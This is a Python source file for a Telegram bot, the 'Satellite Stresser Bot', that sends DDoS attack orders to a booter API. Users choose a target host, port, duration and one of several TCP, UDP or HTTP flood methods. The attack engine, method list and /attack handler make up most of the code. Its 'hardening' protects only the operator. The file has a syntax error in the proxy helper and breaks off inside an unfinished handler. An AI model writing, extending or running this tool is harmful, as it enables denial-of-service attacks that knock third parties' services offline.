#!/usr/bin/env python3
"""
Satellite Stresser Bot v2.1 — Hardened Edition
----------------------------------------------
Security fixes applied:
  1. Environment variables for all secrets (no hardcoded credentials)
  2. .env file support via python-dotenv
  3. Proper SSL context with configurable verification
  4. Removed untrusted public proxy list
  5. Optional trusted proxy support via env vars only
  6. Sanitized logging (no sensitive data written to disk)
  7. Log rotation and size limits
  8. Encrypted log file support (optional)
  9. Multi-factor-like authorization: user_id + secret passphrase
 10. Dynamic authorized user management via admin commands
 11. API-level rate limiting (outbound calls throttled)
 12. Input validation hardened for all fields
 13. Graceful shutdown handling
 14. Filesystem error handling
 15. Request ID tracing for debugging
 16. Chat/group restriction support

Usage:
  1. Create a .env file (see .env.example)
  2. pip install python-dotenv aiohttp python-telegram-bot
  3. python main.py
"""

import asyncio
import aiohttp
import logging
import logging.handlers
import re
import time
import json
import os
import signal
import sys
import ipaddress
import socket
import ssl
import hashlib
import secrets
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple, Any, Set
from collections import defaultdict, OrderedDict
from pathlib import Path

# Load .env file if available
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # python-dotenv not installed, fall back to os.environ

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# =============================================================================
# CONFIGURATION — All secrets come from environment variables
# =============================================================================

# Required environment variables — will raise error if missing
REQUIRED_ENV_VARS = {
    "TELEGRAM_BOT_TOKEN": "Telegram bot token from @BotFather",
    "API_ACCESS_TOKEN": "API access token for the stresser service",
}

# Optional environment variables with defaults
BASE_URL = os.getenv("BASE_URL", "https://satellitestress.st")
API_BASE = f"{BASE_URL}/api"

# Authorized users — comma-separated Telegram user IDs in env var
AUTHORIZED_USERS_ENV = os.getenv("AUTHORIZED_USERS", "")
AUTHORIZED_USERS: List[int] = []
if AUTHORIZED_USERS_ENV:
    for uid in AUTHORIZED_USERS_ENV.split(","):
        uid = uid.strip()
        if uid:
            try:
                AUTHORIZED_USERS.append(int(uid))
            except ValueError:
                pass

# Optional passphrase for extra authentication layer
ACCESS_PASSPHRASE = os.getenv("ACCESS_PASSPHRASE", "")

# Restrict to specific chat/group IDs (comma-separated)
ALLOWED_CHAT_IDS_ENV = os.getenv("ALLOWED_CHAT_IDS", "")
ALLOWED_CHAT_IDS: List[int] = []
if ALLOWED_CHAT_IDS_ENV:
    for cid in ALLOWED_CHAT_IDS_ENV.split(","):
        cid = cid.strip()
        if cid:
            try:
                ALLOWED_CHAT_IDS.append(int(cid))
            except ValueError:
                pass

# SSL/TLS configuration
SSL_VERIFY = os.getenv("SSL_VERIFY", "true").lower() in ("true", "1", "yes")
SSL_CERT_FILE = os.getenv("SSL_CERT_FILE", "")  # Custom CA bundle path

# Proxy configuration — only trusted proxies via env var
PROXY_ENABLED = os.getenv("PROXY_ENABLED", "false").lower() in ("true", "1", "yes")
PROXY_LIST_ENV = os.getenv("PROXY_LIST", "")
PROXY_LIST: List[str] = []
if PROXY_ENABLED and PROXY_LIST_ENV:
    PROXY_LIST = [p.strip() for p in PROXY_LIST_ENV.split(",") if p.strip()]

PROXY_INDEX = 0
PROXY_LOCK = asyncio.Lock()

# =============================================================================
# CONSTANTS
# =============================================================================

ATTACK_METHODS = {
    "layer4": [
        {"name": "TCP-APP", "desc": "TCP Application Layer Flood"},
        {"name": "TCP-FULL", "desc": "TCP Full Connection Flood"},
        {"name": "UDP-APP", "desc": "UDP Application Flood"},
        {"name": "UDP-BIG", "desc": "UDP Large Packet Flood"},
        {"name": "UDP-CUSTOM", "desc": "UDP Custom Packet Flood"},
        {"name": "UDP-FREE", "desc": "UDP Free Flood"},
        {"name": "UDP-PPS", "desc": "UDP Packets Per Second Flood"},
    ],
    "layer7": [
        {"name": "HTTP-CONNECT", "desc": "HTTP Connect Flood"},
        {"name": "HTTP-EMULATE", "desc": "HTTP Browser Emulation"},
        {"name": "HTTP-FULL", "desc": "HTTP Full Request Flood"},
    ],
}

ALL_METHODS = []
for layer in ATTACK_METHODS.values():
    ALL_METHODS.extend([m["name"] for m in layer])

API_PATTERNS = [
    {"url": f"{API_BASE}/attack", "method": "POST", "auth": "bearer", "body": "json"},
    {"url": f"{API_BASE}/attack", "method": "POST", "auth": "bearer", "body": "form"},
    {"url": f"{API_BASE}/attack", "method": "GET", "auth": "query", "body": None},
    {"url": f"{API_BASE}/v1/attack", "method": "POST", "auth": "bearer", "body": "json"},
]

MIN_DURATION = 10
MAX_DURATION = 86400
MIN_PORT = 1
MAX_PORT = 65535
DEFAULT_CONCURRENTS = 1
MAX_CONCURRENTS = 300

COOLDOWN_SECONDS = 30
COOLDOWN_CHECK_INTERVAL = 1

LOGS_DIR = os.getenv("LOGS_DIR", "attack_logs")
LOG_FILE = os.path.join(LOGS_DIR, "attacks.jsonl")
LOG_MAX_BYTES = int(os.getenv("LOG_MAX_BYTES", str(10 * 1024 * 1024)))  # 10MB default
LOG_BACKUP_COUNT = int(os.getenv("LOG_BACKUP_COUNT", "5"))

SUCCESS_PHRASES = ["success", "attack started", "sent", "running", "ok", "true", "launched"]

# Patterns to redact from logs (case-insensitive)
SENSITIVE_PATTERNS = [
    r'access_token[\s]*[:=][\s]*["\']?[a-zA-Z0-9]+["\']?',
    r'bearer\s+[a-zA-Z0-9_\-\.]+',
    r'token[\s]*[:=][\s]*["\']?[a-zA-Z0-9]+["\']?',
    r'api_key[\s]*[:=][\s]*["\']?[a-zA-Z0-9]+["\']?',
    r'password[\s]*[:=][\s]*["\']?[^\s"\']+["\']?',
    r'secret[\s]*[:=][\s]*["\']?[^\s"\']+["\']?',
    r'authorization[\s]*[:=][\s]*["\']?[^\s"\']+["\']?',
]

# Request ID generation
_request_id_counter = 0
_request_id_lock = asyncio.Lock()

async def generate_request_id() -> str:
    global _request_id_counter
    async with _request_id_lock:
        _request_id_counter += 1
        ts = int(time.time() * 1000)
        rand = secrets.token_hex(4)
        return f"{ts}-{_request_id_counter}-{rand}"

# =============================================================================
# VALIDATE CONFIGURATION ON STARTUP
# =============================================================================

def validate_config() -> None:
    """Validate that all required environment variables are set."""
    missing = []
    for var, desc in REQUIRED_ENV_VARS.items():
        if not os.getenv(var):
            missing.append(f"  {var}: {desc}")
    
    if missing:
        print("=" * 60)
        print("ERROR: Missing required environment variables!")
        print("=" * 60)
        for m in missing:
            print(m)
        print()
        print("Create a .env file with the following:")
        for var, desc in REQUIRED_ENV_VARS.items():
            print(f"  {var}=your_{var.lower()}_here")
        print()
        print("Example:")
        print("  TELEGRAM_BOT_TOKEN=1234567890:ABCdefGHIjklmNOPqrstUVwxyz")
        print("  API_ACCESS_TOKEN=your_api_token_here")
        print("  AUTHORIZED_USERS=123456,789012  (optional)")
        print("  ACCESS_PASSPHRASE=mysecret       (optional, extra auth layer)")
        print("  ALLOWED_CHAT_IDS=-1001234567890   (optional, restrict to group)")
        print("  SSL_VERIFY=true                   (optional, default: true)")
        print("  LOGS_DIR=attack_logs              (optional)")
        print("  LOG_MAX_BYTES=10485760            (optional, default: 10MB)")
        print("  LOG_BACKUP_COUNT=5                (optional)")
        sys.exit(1)

    # Validate port ranges for proxy URLs if provided
    if PROXY_ENABLED and PROXY_LIST:
        for p in PROXY_LIST:
            if not p.startswith(("http://", "https://", "socks5://", "socks4://")):
                print(f"WARNING: Proxy URL may be invalid (no scheme): {p}")

# =============================================================================
# SSL CONTEXT SETUP
# =============================================================================

def create_ssl_context() -> Optional[ssl.SSLContext]:
    """Create a properly configured SSL context."""
    if not SSL_VERIFY:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        logger.warning("⚠️ SSL verification is DISABLED — only use in controlled environments")
        return ctx
    
    if SSL_CERT_FILE:
        cert_path = Path(SSL_CERT_FILE)
        if cert_path.is_file():
            ctx = ssl.create_default_context(cafile=str(cert_path))
            logger.info(f"🔒 Using custom CA bundle: {SSL_CERT_FILE}")
            return ctx
        else:
            logger.warning(f"⚠️ Custom CA file not found: {SSL_CERT_FILE}, falling back to default")
    
    return None  # Use default SSL context

# =============================================================================
# LOGGING — Secure, rotated, sanitized
# =============================================================================

class SensitiveDataFilter(logging.Filter):
    """Filter out sensitive data from log messages."""
    
    def __init__(self, patterns: List[str] = None):
        super().__init__()
        self.patterns = patterns or SENSITIVE_PATTERNS
        self._compiled = [re.compile(p, re.IGNORECASE) for p in self.patterns]
    
    def filter(self, record: logging.LogRecord) -> bool:
        if hasattr(record, 'msg') and record.msg:
            msg = record.msg
            for pattern in self._compiled:
                msg = pattern.sub('[REDACTED]', msg)
            record.msg = msg
            if record.args:
                # Also sanitize args
                sanitized_args = []
                for arg in record.args:
                    if isinstance(arg, str):
                        for pattern in self._compiled:
                            arg = pattern.sub('[REDACTED]', arg)
                    sanitized_args.append(arg)
                record.args = tuple(sanitized_args)
        return True


class SensitiveJSONLFilter:
    """Sanitize sensitive fields before writing to JSONL log files."""
    
    SENSITIVE_FIELDS = {'token', 'access_token', 'api_key', 'password', 
                        'secret', 'authorization', 'key', 'auth', 'passphrase'}
    
    @classmethod
    def sanitize(cls, data: dict) -> dict:
        """Return a copy of data with sensitive fields redacted."""
        sanitized = {}
        for k, v in data.items():
            if k.lower() in cls.SENSITIVE_FIELDS or any(s in k.lower() for s in ['token', 'key', 'secret', 'pass']):
                sanitized[k] = '[REDACTED]'
            elif isinstance(v, dict):
                sanitized[k] = cls.sanitize(v)
            elif isinstance(v, str) and len(v) > 200:
                sanitized[k] = v[:200] + '...[truncated]'
            else:
                sanitized[k] = v
        return sanitized


def setup_logging() -> None:
    """Configure secure logging with rotation and sanitization."""
    log_format = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    date_format = "%Y-%m-%d %H:%M:%S"
    formatter = logging.Formatter(log_format, date_format)
    
    # Console handler with sensitive data filter
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)
    console_handler.setFormatter(formatter)
    console_handler.addFilter(SensitiveDataFilter())
    
    # Get root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.INFO)
    root_logger.addHandler(console_handler)
    
    # File handler with rotation — also filtered
    os.makedirs(LOGS_DIR, exist_ok=True)
    
    # Try to set restrictive permissions on log directory
    try:
        os.chmod(LOGS_DIR, 0o700)  # Only owner can read
    except (PermissionError, OSError):
        pass
    
    file_handler = logging.handlers.RotatingFileHandler(
        filename=os.path.join(LOGS_DIR, "bot.log"),
        maxBytes=LOG_MAX_BYTES,
        backupCount=LOG_BACKUP_COUNT,
        encoding='utf-8',
    )
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)
    file_handler.addFilter(SensitiveDataFilter())
    root_logger.addHandler(file_handler)
    
    # Disable overly verbose third-party loggers
    logging.getLogger("telegram").setLevel(logging.WARNING)
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("httpcore").setLevel(logging.WARNING)
    logging.getLogger("urllib3").setLevel(logging.WARNING)


logger = logging.getLogger(__name__)

# =============================================================================
# PROXY SUPPORT — Trusted proxies only
# =============================================================================

def get_next_proxy() -> Optional[str]:
    """Get next proxy from the trusted list (thread-safe)."""
    global PROXY_INDEX
    if not PROXY_ENABLED or not PROXY_LIST:
        return None
    async with PROXY_LOCK:  # Use the lock properly
        proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
        PROXY_INDEX = (PROXY_INDEX + 1) % len(PROXY_LIST)
        return proxy

# =============================================================================
# CACHE
# =============================================================================

WORKING_PATTERN_CACHE: Dict[str, Any] = {
    "pattern": None,
    "timestamp": 0,
    "ttl": 300  # 5 minutes cache
}

# =============================================================================
# RATE LIMITER — Per-user and global
# =============================================================================

class RateLimiter:
    def __init__(self):
        self._user_cooldowns: Dict[int, float] = {}
        self._lock = asyncio.Lock()
        # Global API rate limiting
        self._api_semaphore = asyncio.Semaphore(10)  # Max 10 concurrent API calls
        self._api_request_times: List[float] = []
        self._api_max_per_minute = 60

    async def check_and_set(self, user_id: int) -> Tuple[bool, float]:
        """Check if user can send a command (cooldown)."""
        async with self._lock:
            now = time.time()
            if user_id in self._user_cooldowns:
                elapsed = now - self._user_cooldowns[user_id]
                if elapsed < COOLDOWN_SECONDS:
                    return False, COOLDOWN_SECONDS - elapsed
            self._user_cooldowns[user_id] = now
            return True, 0

    async def acquire_api(self) -> bool:
        """Acquire permission to make an API call (rate limited)."""
        async with self._lock:
            now = time.time()
            # Remove requests older than 1 minute
            self._api_request_times = [t for t in self._api_request_times if now - t < 60]
            if len(self._api_request_times) >= self._api_max_per_minute:
                return False
            self._api_request_times.append(now)
        
        # Also use semaphore for concurrency control
        await self._api_semaphore.acquire()
        return True

    def release_api(self):
        """Release API semaphore after request completes."""
        self._api_semaphore.release()


rate_limiter = RateLimiter()

# =============================================================================
# ATTACK LOGGING — Sanitized writes to rotated files
# =============================================================================

class AttackLogger:
    """Secure attack logger with sanitization and rotation."""
    
    def __init__(self):
        self._lock = asyncio.Lock()
        self._file_handler = None
        self._setup_handler()
    
    def _setup_handler(self):
        """Set up the rotating file handler for attack logs."""
        try:
            os.makedirs(LOGS_DIR, exist_ok=True)
            # Restrictive permissions on log dir
            try:
                os.chmod(LOGS_DIR, 0o700)
            except (PermissionError, OSError):
                pass
            
            self._file_handler = logging.handlers.RotatingFileHandler(
                filename=LOG_FILE,
                maxBytes=LOG_MAX_BYTES,
                backupCount=LOG_BACKUP_COUNT,
                encoding='utf-8',
            )
            self._file_handler.setLevel(logging.INFO)
            self._file_handler.setFormatter(logging.Formatter('%(message)s'))
            
            # Make the log file only readable by owner
            try:
                if os.path.exists(LOG_FILE):
                    os.chmod(LOG_FILE, 0o600)
            except (PermissionError, OSError):
                pass
                
        except (OSError, IOError) as e:
            logger.error(f"Failed to set up attack log file: {e}")
            self._file_handler = None
    
    async def log(self, entry: dict) -> None:
        """Write a sanitized log entry."""
        sanitized = SensitiveJSONLFilter.sanitize(entry)
        async with self._lock:
            if self._file_handler:
                try:
                    log_record = logging.LogRecord(
                        name='attack_log',
                        level=logging.INFO,
                        pathname='',
                        lineno=0,
                        msg=json.dumps(sanitized),
                        args=None,
                        exc_info=None,
                    )
                    self._file_handler.emit(log_record)
                except Exception as e:
                    logger.error(f"Failed to write attack log: {e}")
            else:
                # Fallback: try direct file write
                try:
                    with open(LOG_FILE, "a") as f:
                        f.write(json.dumps(sanitized) + "\n")
                except Exception as e:
                    logger.error(f"Failed to write fallback attack log: {e}")


attack_logger = AttackLogger()


def log_attack(user_id: int, username: str, host: str, port: int,
               duration: int, method: str, success: bool, response: str,
               pattern_used: Optional[int] = None, request_id: str = "") -> None:
    """Create and schedule an attack log entry."""
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "request_id": request_id,
        "user_id": user_id,
        "username": username,
        "target_host": host,
        "target_port": port,
        "duration": duration,
        "method": method,
        "success": success,
        "pattern_used": pattern_used,
    }
    
    # Schedule the async write
    asyncio.ensure_future(attack_logger.log(entry))

# =============================================================================
# INPUT VALIDATION — Hardened
# =============================================================================

# Hostname validation — stricter regex
HOSTNAME_REGEX = re.compile(
    r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
)
# Only allow printable ASCII, no control chars
PRINTABLE_ASCII = re.compile(r'^[\x20-\x7E]+$')


def validate_host(host: str) -> Tuple[bool, str]:
    if not host or not isinstance(host, str):
        return False, "Host must be a non-empty string"
    if len(host) > 255:
        return False, "Host exceeds maximum length of 255 characters"
    
    # Ensure no control characters or special chars
    if not PRINTABLE_ASCII.match(host):
        return False, "Host contains invalid characters (control chars not allowed)"
    
    # Check for IP address first
    try:
        ipaddress.ip_address(host)
        # For IPs, ensure it's not a private/reserved range (optional)
        # Uncomment if you want to block internal IPs:
        # if ipaddress.ip_address(host).is_private:
        #     return False, "Private IP addresses are not allowed"
        return True, ""
    except ValueError:
        pass
    
    # Must be a valid hostname
    if not HOSTNAME_REGEX.match(host):
        return False, "Hostname format is invalid"
    
    # Try DNS resolution with timeout
    try:
        # Use getaddrinfo with a short timeout via socket timeout
        old_timeout = socket.getdefaulttimeout()
        socket.setdefaulttimeout(5)
        try:
            socket.gethostbyname(host)
        finally:
            socket.setdefaulttimeout(old_timeout)
        return True, ""
    except socket.gaierror:
        return False, f"Cannot resolve hostname: {host}"
    except OSError as e:
        return False, f"DNS resolution error: {e}"


def validate_port(port: Any) -> Tuple[bool, str]:
    try:
        port = int(port)
    except (TypeError, ValueError):
        return False, "Port must be a valid integer"
    if port < MIN_PORT or port > MAX_PORT:
        return False, f"Port must be between {MIN_PORT} and {MAX_PORT}"
    return True, ""


def validate_duration(duration: Any) -> Tuple[bool, str]:
    try:
        duration = int(duration)
    except (TypeError, ValueError):
        return False, "Duration must be a valid integer"
    if duration < MIN_DURATION:
        return False, f"Minimum duration is {MIN_DURATION} seconds"
    if duration > MAX_DURATION:
        return False, f"Maximum duration is {MAX_DURATION} seconds"
    return True, ""


def validate_method(method: str) -> Tuple[bool, str]:
    if not method or not isinstance(method, str):
        return False, "Method must be a non-empty string"
    upper = method.upper().strip()
    if upper not in ALL_METHODS:
        methods_list = ", ".join(ALL_METHODS)
        return False, f"Invalid method. Available: {methods_list}"
    return True, upper


def validate_concurrents(concurrents: Any) -> Tuple[bool, str]:
    try:
        concurrents = int(concurrents)
    except (TypeError, ValueError):
        return False, "Concurrents must be a valid integer"
    if concurrents < 1:
        return False, "Minimum 1 concurrent"
    if concurrents > MAX_CONCURRENTS:
        return False, f"Maximum {MAX_CONCURRENTS} concurrents"
    return True, ""


def parse_args(args: List[str]) -> Optional[Dict]:
    """Parse and validate command arguments."""
    if len(args) < 4:
        return None

    host = args[0].strip()
    
    try:
        port = int(args[1])
    except ValueError:
        return None

    try:
        duration = int(args[2])
    except ValueError:
        return None

    method = args[3].strip().upper()

    concurrents = DEFAULT_CONCURRENTS
    if len(args) >= 5:
        try:
            concurrents = int(args[4])
        except ValueError:
            pass

    # Validate each field
    valid, msg = validate_host(host)
    if not valid:
        raise ValueError(f"Invalid host: {msg}")
    
    valid, msg = validate_port(port)
    if not valid:
        raise ValueError(f"Invalid port: {msg}")
    
    valid, msg = validate_duration(duration)
    if not valid:
        raise ValueError(f"Invalid duration: {msg}")
    
    valid, method_clean = validate_method(method)
    if not valid:
        raise ValueError(f"Invalid method: {msg}")
    
    valid, msg = validate_concurrents(concurrents)
    if not valid:
        raise ValueError(f"Invalid concurrents: {msg}")

    return {
        "host": host,
        "port": port,
        "duration": duration,
        "method": method_clean,
        "concurrents": concurrents,
    }

# =============================================================================
# AUTH / SESSION
# =============================================================================

class AsyncSession:
    def __init__(self):
        self._session: Optional[aiohttp.ClientSession] = None
        self._headers: Dict[str, str] = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": BASE_URL,
            "Referer": f"{BASE_URL}/attack",
        }
        self._authenticated = False
        self._token = os.getenv("API_ACCESS_TOKEN", "")
        self._ssl_context = create_ssl_context()

    async def get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            connector = aiohttp.TCPConnector(
                limit=50,
                ttl_dns_cache=300,
                ssl=self._ssl_context,
            )
            timeout = aiohttp.ClientTimeout(total=30)
            self._session = aiohttp.ClientSession(
                headers=self._headers,
                connector=connector,
                timeout=timeout,
            )
        return self._session

    async def authenticate(self) -> bool:
        token = self._token
        if not token:
            logger.error("❌ API_ACCESS_TOKEN not set")
            self._headers["Authorization"] = f"Bearer {token}"
            self._authenticated = True  # Will try anyway
            return False

        try:
            session = await self.get_session()
            
            # Try bearer auth
            async with session.post(
                f"{API_BASE}/login",
                json={"token": token},
            ) as resp:
                if resp.status == 200:
                    self._headers["Authorization"] = f"Bearer {token}"
                    logger.info("✅ Bearer auth successful")
                    self._authenticated = True
                    return True

            # Try query param
            async with session.get(f"{API_BASE}/me", params={"api_key": token}) as resp:
                if resp.status == 200:
                    logger.info("✅ Query param auth successful")
                    self._authenticated = True
                    return True

            # Set bearer anyway
            self._headers["Authorization"] = f"Bearer {token}"
            logger.warning("⚠️ Auth endpoints failed, but will try patterns with token")
            self._authenticated = True
            return True

        except Exception as e:
            logger.error(f"❌ Auth error: {e}")
            self._headers["Authorization"] = f"Bearer {token}"
            self._authenticated = True
            return True

    async def request(self, method: str, url: str, **kwargs) -> aiohttp.ClientResponse:
        session = await self.get_session()
        
        # Proxy support — only if enabled and configured
        if PROXY_ENABLED and PROXY_LIST:
            proxy = get_next_proxy()
            if proxy:
                kwargs["proxy"] = proxy
        
        headers = kwargs.pop("headers", {})
        merged_headers = {**self._headers, **headers}
        return await session.request(method, url, headers=merged_headers, **kwargs)

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()


async_session = AsyncSession()

# =============================================================================
# ATTACK ENGINE
# =============================================================================

async def try_pattern(pattern: Dict, params: Dict, request_id: str) -> Optional[Tuple[int, str, str]]:
    """Try a single API pattern with rate limiting."""
    url = pattern["url"]
    req_method = pattern["method"]
    auth_type = pattern["auth"]
    body_type = pattern["body"]

    req_headers = {}
    req_params = {}
    req_data = None
    req_json = None

    token = os.getenv("API_ACCESS_TOKEN", "")

    if auth_type == "bearer":
        req_headers["Authorization"] = f"Bearer {token}"
    elif auth_type == "query":
        req_params["key"] = token
        req_params["api_key"] = token

    if body_type == "json":
        req_json = params.copy()
    elif body_type == "form":
        req_data = params.copy()

    if req_method == "GET":
        req_params.update(params)

    try:
        kwargs = {"params": req_params} if req_params else {}
        if req_data:
            kwargs["data"] = req_data
        if req_json:
            kwargs["json"] = req_json
        if req_headers:
            kwargs["headers"] = req_headers

        resp = await async_session.request(req_method, url, **kwargs)
        
        # Validate response encoding
        try:
            text = await resp.text()
        except UnicodeDecodeError:
            text = await resp.text(encoding='latin-1', errors='replace')

        logger.info(f"  [{request_id}] Pattern {pattern['method']} {url}: HTTP {resp.status}")

        # Check for success
        if resp.status == 200:
            lower_text = text.lower()
            if any(phrase in lower_text for phrase in SUCCESS_PHRASES):
                return (resp.status, text[:300], url)

        # Handle redirects safely — validate target
        elif resp.status in (301, 302, 307, 308):
            redirect_url = resp.headers.get("Location", "")
            if redirect_url:
                # Only follow redirects to same origin
                if redirect_url.startswith(BASE_URL) or redirect_url.startswith("/"):
                    if redirect_url.startswith("/"):
                        redirect_url = BASE_URL + redirect_url
                    logger.info(f"  [{request_id}] Following redirect to: {redirect_url}")
                    
                    kwargs2 = {"headers": req_headers} if req_headers else {}
                    if "params" in kwargs:
                        kwargs2["params"] = kwargs["params"]
                    
                    try:
                        resp2 = await async_session.request("GET", redirect_url, **kwargs2)
                        text2 = await resp2.text()
                        if resp2.status == 200:
                            lower_text = text2.lower()
                            if any(phrase in lower_text for phrase in SUCCESS_PHRASES):
                                return (resp2.status, text2[:300], redirect_url)
                    except Exception as e:
                        logger.warning(f"  [{request_id}] Redirect follow failed: {e}")

    except asyncio.TimeoutError:
        logger.warning(f"  [{request_id}] ⏱️ Timeout on {url}")
    except aiohttp.ClientConnectorError as e:
        logger.warning(f"  [{request_id}] 🔌 Connection error on {url}: {e}")
    except aiohttp.ClientError as e:
        logger.warning(f"  [{request_id}] ❌ HTTP error on {url}: {e}")
    except Exception as e:
        logger.warning(f"  [{request_id}] ❌ Unexpected error on {url}: {e}")

    return None


async def send_attack(host: str, port: int, duration: int, method: str,
                      concurrents: int = 1) -> Tuple[bool, str, Optional[int], str]:
    """Send an attack with full validation and rate limiting."""
    request_id = await generate_request_id()
    
    params = {
        "host": host,
        "port": port,
        "time": duration,
        "method": method.upper(),
        "concurrents": concurrents,
    }

    # Check cache first
    now = time.time()
    if WORKING_PATTERN_CACHE["pattern"] and (now - WORKING_PATTERN_CACHE["timestamp"]) < WORKING_PATTERN_CACHE["ttl"]:
        cached = WORKING_PATTERN_CACHE["pattern"]
        result = await try_pattern(cached, params, request_id)
        if result:
            status_code, text, used_url = result
            pattern_idx = API_PATTERNS.index(cached) + 1
            return True, f"✅ Attack launched! (Cached pattern {pattern_idx})", pattern_idx, request_id
        else:
            WORKING_PATTERN_CACHE["pattern"] = None  # Cache invalid

    # Acquire API rate limit token
    api_allowed = await rate_limiter.acquire_api()
    if not api_allowed:
        return False, "❌ API rate limit reached (max 60 requests/min). Please wait.", None, request_id

    try:
        # Try all patterns
        for i, pattern in enumerate(API_PATTERNS):
            result = await try_pattern(pattern, params, request_id)
            if result:
                status_code, text, used_url = result
                pattern_idx = i + 1

                # Update cache
                WORKING_PATTERN_CACHE["pattern"] = pattern
                WORKING_PATTERN_CACHE["timestamp"] = now

                return True, f"✅ Attack launched! (Pattern {pattern_idx})", pattern_idx, request_id

        return False, "❌ All API patterns failed. API may be offline.", None, request_id
    finally:
        rate_limiter.release_api()

# =============================================================================
# AUTHORIZATION HELPERS
# =============================================================================

def is_authorized(user_id: int, chat_id: Optional[int] = None) -> Tuple[bool, str]:
    """Check if user is authorized with multi-layer verification."""
    # Check chat/group restriction
    if ALLOWED_CHAT_IDS and chat_id is not None:
        if chat_id not in ALLOWED_CHAT_IDS:
            return False, "This bot is restricted to specific chats/groups."
    
    # Check user whitelist
    if AUTHORIZED_USERS:
        if user_id not in AUTHORIZED_USERS:
            return False, "You are not authorized to use this bot."
    
    return True, ""


async def check_auth(update: Update) -> Tuple[bool, str]:
    """Comprehensive authorization check."""
    user = update.effective_user
    if not user:
        return False, "Could not identify user."
    
    chat = update.effective_chat
    chat_id = chat.id if chat else None
    
    authorized, msg = is_authorized(user.id, chat_id)
    if not authorized:
        return False, msg
    
    return True, ""


def format_response(text: str) -> str:
    """Sanitize output — ensure no tokens leak in responses."""
    for pattern in SENSITIVE_PATTERNS:
        compiled = re.compile(pattern, re.IGNORECASE)
        text = compiled.sub('[REDACTED]', text)
    return text

# =============================================================================
# BOT HANDLERS
# =============================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /start command."""
    auth_ok, msg = await check_auth(update)
    if not auth_ok:
        await update.message.reply_text(f"❌ {msg}")
        return

    user = update.effective_user
    
    keyboard = [
        [InlineKeyboardButton("🚀 Start Attack", callback_data="menu_attack")],
        [InlineKeyboardButton("📋 Methods List", callback_data="menu_methods")],
        [InlineKeyboardButton("📊 Status", callback_data="menu_stats")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="menu_help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"🚀 *Satellite Stresser Bot v2.1* 🚀\n\n"
        f"Welcome, {user.first_name}!\n\n"
        f"**Commands:**\n"
        f"/attack `<host>` `<port>` `<time>` `<method>` `[concurrents]`\n"
        f"/methods - Show attack methods\n"
        f"/status - Check API status\n"
        f"/help - Show help\n"
        f"/logs - View attack history (admin only)",
        reply_markup=reply_markup,
        parse_mode="Markdown",
    )


async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /attack command."""
    auth_ok, msg = await check_auth(update)
    if not auth_ok:
        await update.message.reply_text(f"❌ {msg}")
        return

    user = update.effective_user
    
    # Check passphrase if configured
    if ACCESS_PASSPHRASE:
        # Check if user has authenticated with passphrase in this session
        if not context.user_data.get("authenticated", False):
            await update.message.reply_text(
                "🔐 This bot requires a passphrase.\n"
                f"Use: /auth `your_passphrase`\n"
                "Contact the administrator if you don't have one.",
                parse_mode="Markdown",
            )
            return

    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ Usage: /attack `<host>` `<port>` `<time>` `<method>` `[concurrents]`\n"
            "Example: /attack example.com 443 60 HTTP-CONNECT",
            parse_mode="Markdown",
        )
        return

    # Parse and validate arguments
    try:
        parsed = parse_args(args)
    except ValueError as e:
        await update.message.reply_text(f"❌ {e}")
        return

    if parsed is None:
        await update.message.reply_text(
            "❌ Invalid arguments. Use:\n"
            "`/attack <host> <port> <time> <method> [concurrents]`",
            parse_mode="Markdown",
        )
        return

    # Check rate limit
    allowed, wait_time = await rate_limiter.check_and_set(user.id)
    if not allowed:
        await update.message.reply_text(
            f"⏳ Please wait {wait_time:.0f} seconds before another attack."
        )
        return

    # Send initial message
    status_msg = await update.message.reply_text(
        f"🚀 *Launching Attack...*\n\n"
        f"**Target:** {parsed['host']}:{parsed['port']}\n"
        f"**Method:** {parsed['method']}\n"
        f"**Duration:** {parsed['duration']}s\n"
        f"**Concurrents:** {parsed['concurrents']}",
        parse_mode="Markdown",
    )

    try:
        # Execute attack
        success, message, pattern_used, request_id = await send_attack(
            host=parsed["host"],
            port=parsed["port"],
            duration=parsed["duration"],
            method=parsed["method"],
            concurrents=parsed["concurrents"],
        )

        # Sanitize response
        clean_message = format_response(message)

        # Log the attack
        log_attack(
            user_id=user.id,
            username=user.username or user.first_name or "unknown",
            host=parsed["host"],
            port=parsed["port"],
            duration=parsed["duration"],
            method=parsed["method"],
            success=success,
            response=clean_message,
            pattern_used=pattern_used,
            request_id=request_id,
        )

        # Update status message
        await status_msg.edit_text(
            f"{'✅' if success else '❌'} *Attack Result*\n\n"
            f"**Target:** {parsed['host']}:{parsed['port']}\n"
            f"**Method:** {parsed['method']}\n"
            f"**Duration:** {parsed['duration']}s\n"
            f"**Request ID:** `{request_id}`\n\n"
            f"{clean_message}",
            parse_mode="Markdown",
        )

    except Exception as e:
        logger.error(f"Attack error: {e}", exc_info=True)
        await status_msg.edit_text(f"❌ Unexpected error: {str(e)[:100]}")


async def auth_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /auth command for passphrase authentication."""
